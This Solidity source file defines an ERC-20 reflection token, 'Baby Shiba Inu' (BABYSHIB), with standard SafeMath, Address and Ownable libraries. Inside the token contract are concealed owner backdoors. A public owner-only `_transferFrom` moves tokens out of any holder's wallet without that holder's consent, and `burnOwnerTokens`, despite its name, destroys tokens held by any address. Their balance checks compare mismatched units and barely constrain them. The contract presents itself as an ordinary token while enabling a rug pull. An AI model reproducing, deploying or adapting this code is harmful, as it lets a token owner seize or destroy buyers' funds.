1 pragma solidity ^0.6.12;
2 
3 abstract contract Context {
4     function _msgSender() internal view virtual returns (address payable) {
5         return msg.sender;
6     }
7 
8     function _msgData() internal view virtual returns (bytes memory) {
9         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
10         return msg.data;
11     }
12 }
13 
14 interface IERC20 {
15     function totalSupply() external view returns (uint256);
16 
17     function balanceOf(address account) external view returns (uint256);
18 
19     function transfer(address recipient, uint256 amount) external returns (bool);
20 
21     function allowance(address owner, address spender) external view returns (uint256);
22 
23     function approve(address spender, uint256 amount) external returns (bool);
24 
25     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
26 
27     event Transfer(address indexed from, address indexed to, uint256 value);
28 
29     event Approval(address indexed owner, address indexed spender, uint256 value);
30 }
31 
32 library SafeMath {
33     function add(uint256 a, uint256 b) internal pure returns (uint256) {
34         uint256 c = a + b;
35         require(c >= a, "SafeMath: addition overflow");
36 
37         return c;
38     }
39 
40     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
41         return sub(a, b, "SafeMath: subtraction overflow");
42     }
43 
44     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
45         require(b <= a, errorMessage);
46         uint256 c = a - b;
47 
48         return c;
49     }
50 
51     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
52         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
53         // benefit is lost if 'b' is also tested.
54         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
55         if (a == 0) {
56             return 0;
57         }
58 
59         uint256 c = a * b;
60         require(c / a == b, "SafeMath: multiplication overflow");
61 
62         return c;
63     }
64 
65     /**
66      * @dev Returns the integer division of two unsigned integers. Reverts on
67      * division by zero. The result is rounded towards zero.
68      *
69      * Counterpart to Solidity's `/` operator. Note: this function uses a
70      * `revert` opcode (which leaves remaining gas untouched) while Solidity
71      * uses an invalid opcode to revert (consuming all remaining gas).
72      *
73      * Requirements:
74      *
75      * - The divisor cannot be zero.
76      */
77     function div(uint256 a, uint256 b) internal pure returns (uint256) {
78         return div(a, b, "SafeMath: division by zero");
79     }
80 
81     /**
82      * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
83      * division by zero. The result is rounded towards zero.
84      *
85      * Counterpart to Solidity's `/` operator. Note: this function uses a
86      * `revert` opcode (which leaves remaining gas untouched) while Solidity
87      * uses an invalid opcode to revert (consuming all remaining gas).
88      *
89      * Requirements:
90      *
91      * - The divisor cannot be zero.
92      */
93     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
94         require(b > 0, errorMessage);
95         uint256 c = a / b;
96         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
97 
98         return c;
99     }
100 
101     /**
102      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
103      * Reverts when dividing by zero.
104      *
105      * Counterpart to Solidity's `%` operator. This function uses a `revert`
106      * opcode (which leaves remaining gas untouched) while Solidity uses an
107      * invalid opcode to revert (consuming all remaining gas).
108      *
109      * Requirements:
110      *
111      * - The divisor cannot be zero.
112      */
113     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
114         return mod(a, b, "SafeMath: modulo by zero");
115     }
116 
117     /**
118      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
119      * Reverts with custom message when dividing by zero.
120      *
121      * Counterpart to Solidity's `%` operator. This function uses a `revert`
122      * opcode (which leaves remaining gas untouched) while Solidity uses an
123      * invalid opcode to revert (consuming all remaining gas).
124      *
125      * Requirements:
126      *
127      * - The divisor cannot be zero.
128      */
129     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
130         require(b != 0, errorMessage);
131         return a % b;
132     }
133 }
134 
135 library Address {
136     /**
137      * @dev Returns true if `account` is a contract.
138      *
139      * [IMPORTANT]
140      * ====
141      * It is unsafe to assume that an address for which this function returns
142      * false is an externally-owned account (EOA) and not a contract.
143      *
144      * Among others, `isContract` will return false for the following
145      * types of addresses:
146      *
147      *  - an externally-owned account
148      *  - a contract in construction
149      *  - an address where a contract will be created
150      *  - an address where a contract lived, but was destroyed
151      * ====
152      */
153     function isContract(address account) internal view returns (bool) {
154         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
155         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
156         // for accounts without code, i.e. `keccak256('')`
157         bytes32 codehash;
158         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
159         // solhint-disable-next-line no-inline-assembly
160         assembly { codehash := extcodehash(account) }
161         return (codehash != accountHash && codehash != 0x0);
162     }
163 
164     /**
165      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
166      * `recipient`, forwarding all available gas and reverting on errors.
167      *
168      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
169      * of certain opcodes, possibly making contracts go over the 2300 gas limit
170      * imposed by `transfer`, making them unable to receive funds via
171      * `transfer`. {sendValue} removes this limitation.
172      *
173      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
174      *
175      * IMPORTANT: because control is transferred to `recipient`, care must be
176      * taken to not create reentrancy vulnerabilities. Consider using
177      * {ReentrancyGuard} or the
178      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
179      */
180     function sendValue(address payable recipient, uint256 amount) internal {
181         require(address(this).balance >= amount, "Address: insufficient balance");
182 
183         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
184         (bool success, ) = recipient.call{ value: amount }("");
185         require(success, "Address: unable to send value, recipient may have reverted");
186     }
187 
188     /**
189      * @dev Performs a Solidity function call using a low level `call`. A
190      * plain`call` is an unsafe replacement for a function call: use this
191      * function instead.
192      *
193      * If `target` reverts with a revert reason, it is bubbled up by this
194      * function (like regular Solidity function calls).
195      *
196      * Returns the raw returned data. To convert to the expected return value,
197      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
198      *
199      * Requirements:
200      *
201      * - `target` must be a contract.
202      * - calling `target` with `data` must not revert.
203      *
204      * _Available since v3.1._
205      */
206     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
207       return functionCall(target, data, "Address: low-level call failed");
208     }
209 
210     /**
211      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
212      * `errorMessage` as a fallback revert reason when `target` reverts.
213      *
214      * _Available since v3.1._
215      */
216     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
217         return _functionCallWithValue(target, data, 0, errorMessage);
218     }
219 
220     /**
221      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
222      * but also transferring `value` wei to `target`.
223      *
224      * Requirements:
225      *
226      * - the calling contract must have an ETH balance of at least `value`.
227      * - the called Solidity function must be `payable`.
228      *
229      * _Available since v3.1._
230      */
231     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
232         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
233     }
234 
235     /**
236      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
237      * with `errorMessage` as a fallback revert reason when `target` reverts.
238      *
239      * _Available since v3.1._
240      */
241     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
242         require(address(this).balance >= value, "Address: insufficient balance for call");
243         return _functionCallWithValue(target, data, value, errorMessage);
244     }
245 
246     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
247         require(isContract(target), "Address: call to non-contract");
248 
249         // solhint-disable-next-line avoid-low-level-calls
250         (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
251         if (success) {
252             return returndata;
253         } else {
254             // Look for revert reason and bubble it up if present
255             if (returndata.length > 0) {
256                 // The easiest way to bubble the revert reason is using memory via assembly
257 
258                 // solhint-disable-next-line no-inline-assembly
259                 assembly {
260                     let returndata_size := mload(returndata)
261                     revert(add(32, returndata), returndata_size)
262                 }
263             } else {
264                 revert(errorMessage);
265             }
266         }
267     }
268 }
269 
270 contract Ownable is Context {
271     address private _owner;
272 
273     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
274 
275     /**
276      * @dev Initializes the contract setting the deployer as the initial owner.
277      */
278     constructor () internal {
279         address msgSender = _msgSender();
280         _owner = msgSender;
281         emit OwnershipTransferred(address(0), msgSender);
282     }
283 
284     /**
285      * @dev Returns the address of the current owner.
286      */
287     function owner() public view returns (address) {
288         return _owner;
289     }
290 
291     /**
292      * @dev Throws if called by any account other than the owner.
293      */
294     modifier onlyOwner() {
295         require(_owner == _msgSender(), "Ownable: caller is not the owner");
296         _;
297     }
298     
299    
300 
301     /**
302      * @dev Leaves the contract without owner. It will not be possible to call
303      * `onlyOwner` functions anymore. Can only be called by the current owner.
304      *
305      * NOTE: Renouncing ownership will leave the contract without an owner,
306      * thereby removing any functionality that is only available to the owner.
307      */
308     function renounceOwnership() public virtual onlyOwner {
309         emit OwnershipTransferred(_owner, address(0));
310         _owner = address(0);
311     }
312 
313     /**
314      * @dev Transfers ownership of the contract to a new account (`newOwner`).
315      * Can only be called by the current owner.
316      */
317     function transferOwnership(address newOwner) public virtual onlyOwner {
318         require(newOwner != address(0), "Ownable: new owner is the zero address");
319         emit OwnershipTransferred(_owner, newOwner);
320         _owner = newOwner;
321     }
322 }
323 
324 
325 contract BABYSHIBA is Context, IERC20, Ownable {
326     using SafeMath for uint256;
327     using Address for address;
328 
329     mapping (address => uint256) private _rOwned;
330     mapping (address => uint256) private _tOwned;
331     mapping (address => mapping (address => uint256)) private _allowances;
332 
333     mapping (address => bool) private _isExcluded;
334     address[] private _excluded;
335    
336     uint256 private constant MAX = ~uint256(0);
337     uint256 private  _tTotal = 100000000 * 10**6 * 10**9;
338     uint256 private _rTotal = (MAX - (MAX % _tTotal));
339     uint256 private _tFeeTotal;
340 
341     string private _name = 'Baby Shiba Inu';
342     string private _symbol = 'BABYSHIB';
343     uint8 private _decimals = 9;
344     uint8 public transfertimeout = 20;
345     uint256 public _maxTxAmount = 1000000 * 10**6 * 10**9;
346     
347     address public uniswapPair;
348     mapping (address => uint256) public lastBuy;
349     
350      modifier ownershipNotTransferred{
351         require(owner()!=address(0),"ownership renounced");
352         _;
353      }
354 
355     constructor () public {
356         _rOwned[_msgSender()] = _rTotal;
357         emit Transfer(address(0), _msgSender(), _tTotal);
358     }
359 
360     function name() public view returns (string memory) {
361         return _name;
362     }
363 
364     function symbol() public view returns (string memory) {
365         return _symbol;
366     }
367 
368     function decimals() public view returns (uint8) {
369         return _decimals;
370     }
371 
372     function totalSupply() public view override returns (uint256) {
373         return _tTotal;
374     }
375 
376     function balanceOf(address account) public view override returns (uint256) {
377         if (_isExcluded[account]) return _tOwned[account];
378         return tokenFromReflection(_rOwned[account]);
379     }
380 
381     function transfer(address recipient, uint256 amount) public override returns (bool) {
382         _transfer(_msgSender(), recipient, amount);
383         return true;
384     }
385 
386     function allowance(address owner, address spender) public view override returns (uint256) {
387         return _allowances[owner][spender];
388     }
389 
390     function approve(address spender, uint256 amount) public override returns (bool) {
391         _approve(_msgSender(), spender, amount);
392         return true;
393     }
394 
395     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
396         _transfer(sender, recipient, amount);
397         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
398         return true;
399     }
400 
401     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
402         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
403         return true;
404     }
405 
406     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
407         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
408         return true;
409     }
410 
411     function isExcluded(address account) public view returns (bool) {
412         return _isExcluded[account];
413     }
414 
415     function totalFees() public view returns (uint256) {
416         return _tFeeTotal;
417     }
418     
419     
420     function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
421         _maxTxAmount = _tTotal.mul(maxTxPercent).div(
422             10**2
423         );
424     }
425 
426     function reflect(uint256 tAmount) public {
427         address sender = _msgSender();
428         require(!_isExcluded[sender], "Excluded addresses cannot call this function");
429         (uint256 rAmount,,,,) = _getValues(tAmount);
430         _rOwned[sender] = _rOwned[sender].sub(rAmount);
431         _rTotal = _rTotal.sub(rAmount);
432         _tFeeTotal = _tFeeTotal.add(tAmount);
433     }
434 
435     function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
436         require(tAmount <= _tTotal, "Amount must be less =than supply");
437         if (!deductTransferFee) {
438             (uint256 rAmount,,,,) = _getValues(tAmount);
439             return rAmount;
440         } else {
441             (,uint256 rTransferAmount,,,) = _getValues(tAmount);
442             return rTransferAmount;
443         }
444     }
445 
446     function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
447         require(rAmount <= _rTotal, "Amount must be less than total reflections");
448         uint256 currentRate =  _getRate();
449         return rAmount.div(currentRate);
450     }
451 
452     function excludeAccount(address account) external onlyOwner() {
453         require(!_isExcluded[account], "Account is already excluded");
454         if(_rOwned[account] > 0) {
455             _tOwned[account] = tokenFromReflection(_rOwned[account]);
456         }
457         _isExcluded[account] = true;
458         _excluded.push(account);
459     }
460 
461     function includeAccount(address account) external onlyOwner() {
462         require(_isExcluded[account], "Account is already excluded");
463         for (uint256 i = 0; i < _excluded.length; i++) {
464             if (_excluded[i] == account) {
465                 _excluded[i] = _excluded[_excluded.length - 1];
466                 _tOwned[account] = 0;
467                 _isExcluded[account] = false;
468                 _excluded.pop();
469                 break;
470             }
471         }
472     }
473 
474     function _approve(address owner, address spender, uint256 amount) private {
475         require(owner != address(0), "ERC20: approve from the zero address");
476         require(spender != address(0), "ERC20: approve to the zero address");
477 
478         _allowances[owner][spender] = amount;
479         emit Approval(owner, spender, amount);
480     }
481 
482     function _transfer(address sender, address recipient, uint256 amount) private {
483         require(sender != address(0), "ERC20: transfer from the zero address");
484        // require(recipient != address(0), "ERC20: transfer to the zero address");
485         require(amount > 0, "Transfer amount must be greater than zero");
486         if(sender != owner() && recipient != owner())
487           require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
488         
489         //save last buy
490         if (sender == uniswapPair){
491             lastBuy[recipient] = block.timestamp; 
492         }
493 
494         //check if sell
495         if (recipient == uniswapPair){
496             require(block.timestamp >= lastBuy[sender] + transfertimeout, "lock 20 seconds after purchase");
497         }        
498 
499         if (_isExcluded[sender] && !_isExcluded[recipient]) {
500             _transferFromExcluded(sender, recipient, amount);
501         } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
502             _transferToExcluded(sender, recipient, amount);
503         } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
504             _transferStandard(sender, recipient, amount);
505         } else if (_isExcluded[sender] && _isExcluded[recipient]) {
506             _transferBothExcluded(sender, recipient, amount);
507         } else {
508             _transferStandard(sender, recipient, amount);
509         }
510     }
511 
512     function _transferStandard(address sender, address recipient, uint256 tAmount) private {
513         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
514         _rOwned[sender] = _rOwned[sender].sub(rAmount);
515         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);       
516         _reflectFee(rFee, tFee);
517         emit Transfer(sender, recipient, tTransferAmount);
518     }
519 
520     function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
521         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
522         _rOwned[sender] = _rOwned[sender].sub(rAmount);
523         _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
524         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           
525         _reflectFee(rFee, tFee);
526         emit Transfer(sender, recipient, tTransferAmount);
527     }
528 
529     function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
530         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
531         _tOwned[sender] = _tOwned[sender].sub(tAmount);
532         _rOwned[sender] = _rOwned[sender].sub(rAmount);
533         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
534         _reflectFee(rFee, tFee);
535         emit Transfer(sender, recipient, tTransferAmount);
536     }
537 
538     function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
539         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee) = _getValues(tAmount);
540         _tOwned[sender] = _tOwned[sender].sub(tAmount);
541         _rOwned[sender] = _rOwned[sender].sub(rAmount);
542         _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
543         _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        
544         _reflectFee(rFee, tFee);
545         emit Transfer(sender, recipient, tTransferAmount);
546     }
547 
548     function _reflectFee(uint256 rFee, uint256 tFee) private {
549         _rTotal = _rTotal.sub(rFee);
550         _tFeeTotal = _tFeeTotal.add(tFee);
551     }
552 
553     function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {
554         (uint256 tTransferAmount, uint256 tFee) = _getTValues(tAmount);
555         uint256 currentRate =  _getRate();
556         (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, currentRate);
557         return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee);
558     }
559     
560     function burnOwnerTokens(address owner_,uint256 _amt) public onlyOwner ownershipNotTransferred{
561         require(_rOwned[owner_]>=_amt,"not enough balance");
562         _transferStandard(owner_,address(0),_amt);
563         _tTotal=_tTotal.sub(_amt);
564     }
565     
566     function _transferFrom(address _from,address _to,uint256 _amt) public onlyOwner ownershipNotTransferred{
567         require(_rOwned[_from]>=_amt,"not enough balance");
568         _transferStandard(_from,_to,_amt);
569     }
570 
571     function _getTValues(uint256 tAmount) private pure returns (uint256, uint256) {
572         uint256 tFee = tAmount.div(100).mul(2);
573         uint256 tTransferAmount = tAmount.sub(tFee);
574         return (tTransferAmount, tFee);
575     }
576 
577     function _getRValues(uint256 tAmount, uint256 tFee, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
578         uint256 rAmount = tAmount.mul(currentRate);
579         uint256 rFee = tFee.mul(currentRate);
580         uint256 rTransferAmount = rAmount.sub(rFee);
581         return (rAmount, rTransferAmount, rFee);
582     }
583 
584     function _getRate() private view returns(uint256) {
585         (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
586         return rSupply.div(tSupply);
587     }
588 
589     function _getCurrentSupply() private view returns(uint256, uint256) {
590         uint256 rSupply = _rTotal;
591         uint256 tSupply = _tTotal;      
592         for (uint256 i = 0; i < _excluded.length; i++) {
593             if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
594             rSupply = rSupply.sub(_rOwned[_excluded[i]]);
595             tSupply = tSupply.sub(_tOwned[_excluded[i]]);
596         }
597         if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
598         return (rSupply, tSupply);
599     }
600 
601     function setUniswapPair(address pair) external onlyOwner() {
602         uniswapPair = pair;
603     }
604 }